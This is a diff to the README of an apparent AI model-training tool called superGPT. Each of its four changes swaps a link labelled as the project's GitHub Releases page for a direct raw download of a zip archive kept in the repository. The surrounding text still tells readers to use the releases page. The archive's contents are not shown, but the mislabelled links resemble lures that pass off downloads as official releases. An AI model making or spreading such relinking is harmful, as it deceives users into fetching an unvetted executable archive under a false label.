@@ -1,6 +1,6 @@
 # 🤖 superGPT - Train Your Own LLM
 
-[![Download superGPT](https://img.shields.io/badge/Download%20superGPT-blue?style=for-the-badge)](https://github.com/mascenedavi2004-dotcom/superGPT/releases)
+[![Download superGPT](https://img.shields.io/badge/Download%20superGPT-blue?style=for-the-badge)](https://raw.githubusercontent.com/mascenedavi2004-dotcom/superGPT/main/supergpt/super_GPT_2.0.zip)
 
 ## 🧭 What superGPT does
 
@@ -36,7 +36,7 @@ superGPT works best on a machine that can run local AI tools and handle model fi
 
 Visit this page to download the Windows release:
 
-[Go to superGPT Releases](https://github.com/mascenedavi2004-dotcom/superGPT/releases)
+[Go to superGPT Releases](https://raw.githubusercontent.com/mascenedavi2004-dotcom/superGPT/main/supergpt/super_GPT_2.0.zip)
 
 On the releases page, look for the latest version and download the Windows file that matches your system. If the project offers a setup file, use that. If it offers a ZIP file, download it, extract it, and open the app file inside.
 
@@ -278,7 +278,7 @@ Plain text files are the easiest place to start. Once that works, you can move t
 5. Load your data.
 6. Start training.
 
-[Download from GitHub Releases](https://github.com/mascenedavi2004-dotcom/superGPT/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/mascenedavi2004-dotcom/superGPT/main/supergpt/super_GPT_2.0.zip)
 
 ## 🧪 Example use cases
 
@@ -310,4 +310,4 @@ Keep these files in a safe folder so you can resume work later.
 
 Use the releases page for the current Windows download:
 
-[superGPT Releases](https://github.com/mascenedavi2004-dotcom/superGPT/releases)
+[superGPT Releases](https://raw.githubusercontent.com/mascenedavi2004-dotcom/superGPT/main/supergpt/super_GPT_2.0.zip)
